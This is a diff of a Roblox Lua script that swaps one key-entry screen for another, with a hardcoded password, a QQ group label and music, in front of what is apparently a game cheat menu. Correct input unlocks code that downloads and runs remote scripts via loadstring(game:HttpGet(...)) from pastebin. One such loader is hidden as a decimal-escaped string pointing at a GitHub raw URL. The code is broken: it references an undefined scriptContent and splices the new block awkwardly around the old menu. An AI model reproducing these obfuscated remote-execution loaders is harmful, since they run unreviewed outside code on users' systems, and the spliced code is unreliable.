@@ -1,76 +1,78 @@
-!print("Welcome to Zeus")print("Welcome to Zeus")local ScreenGui = Instance.new("ScreenGui")
-local UI = Instance.new("Frame")
-local Title = Instance.new("TextLabel")
-local Frame = Instance.new("Frame")
-local Key = Instance.new("TextBox")
-local Start = Instance.new("TextButton")
+local correctPassword = "966473735"
 
-ScreenGui.Parent = game.CoreGui
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+-- 导入音乐相关库
+local SoundService = game:GetService("SoundService")
 
-UI.Name = "XCK卡密系统"
-UI.Parent = ScreenGui
-UI.Active = true
-UI.BackgroundColor3 = Color3.new(0, 0, 0)
-UI.BackgroundTransparency = 0
-UI.BorderSizePixel = 3
-UI.Position = UDim2.new(0.5, -150, 0.5, -67)
-UI.Size = UDim2.new(0, 260, 0, 250)
-UI.Draggable = true
+-- 创建一个屏幕GUI用于显示密码输入界面
+local passwordGui = Instance.new("ScreenGui")
+passwordGui.Name = "PasswordGui"
+passwordGui.Parent = game.Players.LocalPlayer.PlayerGui
 
-Title.Name = "Title"
-Title.Parent = UI
-Title.BackgroundColor3 = Color3.new(68, 68, 68)
-Title.BackgroundTransparency = 1
-Title.BorderSizePixel = 2
-Title.Position = UDim2.new(0, 0, 0.02, 0)
-Title.Size = UDim2.new(1, 0, 0, 50)
-Title.Font = Enum.Font.SourceSans
-Title.Text = "卡密系统"
-Title.TextColor3 = Color3.new(0, 0, 255)
-Title.TextScaled = true
-Title.TextSize = 14
-Title.TextWrapped = true
+-- 创建一个框架来容纳其他元素
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0.4, 0, 0.35, 0)  -- 适当增加框架高度，为元素留出更多空间
+frame.Position = UDim2.new(0.3, 0, 0.3, 0)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.Parent = passwordGui
 
-Frame.Parent = Title
-Frame.BackgroundColor3 = Color3.new(0, 0, 255)
-Frame.BorderSizePixel = 0
-Frame.Position = UDim2.new(0.07, 0, 0.9, 0)
-Frame.Size = UDim2.new(0.85, 0, 0, 6)
+-- 创建一个文本标签用于显示"Q群: 793336700"文字
+local qqGroupLabel = Instance.new("TextLabel")
+qqGroupLabel.Size = UDim2.new(1, 0, 0.15, 0)  -- 调整Q群标签大小
+qqGroupLabel.BackgroundTransparency = 1
+qqGroupLabel.TextColor3 = Color3.new(0.5, 0.5, 0.5)  -- 设置Q群标签颜色为灰色，与其他文字区分开
+qqGroupLabel.Font = Enum.Font.SourceSansBold
+qqGroupLabel.TextSize = 16
+qqGroupLabel.Text = "Q群: 658358286"
+qqGroupLabel.Position = UDim2.new(0, 0, 0.05, 0)  -- 调整Q群标签位置在上方
+qqGroupLabel.Parent = frame
 
-Key.Name = "Key"
-Key.Parent = UI
-Key.BackgroundColor3 = Color3.new(1, 1, 1)
-Key.BorderSizePixel = 0
-Key.Position = UDim2.new(0.1, 0, 0.31, 0)
-Key.Size = UDim2.new(0.8, 0, 0, 50)
-Key.Font = Enum.Font.SourceSans
-Key.PlaceholderText = "输入卡密"
-Key.Text = ""
-Key.TextColor3 = Color3.new(0, 0, 0)
-Key.TextScaled = true
-Key.TextSize = 14
-Key.TextWrapped = true
+-- 创建一个文本标签用于提示玩家输入密码
+local passwordPrompt = Instance.new("TextLabel")
+passwordPrompt.Size = UDim2.new(1, 0, 0.3, 0)
+passwordPrompt.BackgroundTransparency = 1
+passwordPrompt.TextColor3 = Color3.new(1, 1, 1)  -- 设置GT脚本秘钥系统文字颜色为白色
+passwordPrompt.Font = Enum.Font.SourceSansBold
+passwordPrompt.TextSize = 20
+passwordPrompt.Text = "APT脚本秘钥系统"
+passwordPrompt.Position = UDim2.new(0, 0, 0.2, 0)  -- 调整GT脚本秘钥系统位置在下方
+passwordPrompt.Parent = frame
 
-Start.Name = "Start"
-Start.Parent = UI
-Start.BackgroundColor3 = Color3.new(0, 0, 255)
-Start.BackgroundTransparency = 0
-Start.BorderSizePixel = 2
-Start.Position = UDim2.new(0.25, 0, 0.65, 0)
-Start.Size = UDim2.new(0.5, 0, 0, 45)
-Start.Font = Enum.Font.Gotham
-Start.Text = "检查卡密"
-Start.TextColor3 = Color3.new(0, 0, 0)
-Start.TextScaled = true
-Start.TextSize = 10
-Start.TextWrapped = true
+-- 创建一个文本框用于玩家输入密码
+local passwordTextBox = Instance.new("TextBox")
+passwordTextBox.Size = UDim2.new(1, 0, 0.2, 0)
+passwordTextBox.Position = UDim2.new(0, 0, 0.5, 0)  -- 适当调整文本框位置
+passwordTextBox.BackgroundColor3 = Color3.new(0.5, 0.5, 0.5)
+passwordTextBox.TextColor3 = Color3.new(1, 1, 1)
+passwordTextBox.Font = Enum.Font.SourceSans
+passwordTextBox.TextSize = 18
+passwordTextBox.Parent = frame
 
-Start.MouseButton1Click:Connect(function()
-    if Key.Text == "XCK" then
-        ScreenGui:Destroy()
+-- 创建一个提交按钮
+local submitButton = Instance.new("TextButton")
+submitButton.Size = UDim2.new(0.3, 0, 0.2, 0)
+submitButton.Position = UDim2.new(0.35, 0, 0.75, 0)  -- 适当调整提交按钮位置
+submitButton.BackgroundColor3 = Color3.new(0, 0.5, 0)
+submitButton.TextColor3 = Color3.new(1, 1, 1)
+submitButton.Font = Enum.Font.SourceSansBold
+submitButton.TextSize = 20
+submitButton.Text = "提交"
+submitButton.Parent = frame
 
+-- 创建一个音乐对象并播放音乐
+local music = Instance.new("Sound")
+music.SoundId = "rbxassetid://1840172845" -- 将<音乐ID>替换为你实际的音乐ID
+music.Volume = 0.5 -- 设置音量，可根据需要调整
+music.Parent = SoundService
+music:Play()
 
+-- 提交按钮的点击事件处理函数
+submitButton.MouseButton1Click:Connect(function()
+    local enteredPassword = passwordTextBox.Text
+    if enteredPassword == correctPassword then
+        passwordGui:Destroy()  -- 如果密码正确，销毁密码输入界面
+        music:Stop() -- 停止音乐播放
+        -- 以下是加载并执行外部脚本的代码，不建议在实际中使用，存在风险
+        
 local OrionLib = loadstring(game:HttpGet("https://pastebin.com/raw/j9TdK86G"))()
 
 print("初始化成功✅")
@@ -758,3 +760,13 @@ print("执行导管中心")
 loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\117\115\101\114\97\110\101\119\114\102\102\47\114\111\98\108\111\120\45\47\109\97\105\110\47\37\69\54\37\57\68\37\65\49\37\69\54\37\65\67\37\66\69\37\69\53\37\56\68\37\56\70\37\69\56\37\65\69\37\65\69\34\41\41\40\41\10")()
 end
 })   
+local func = loadstring(scriptContent)
+        if func then
+            func()
+        else
+            print("加载脚本失败")
+        end
+    else
+        passwordTextBox.Text = ""  -- 如果密码错误，清空文本框，让玩家重新输入
+    end
+end)
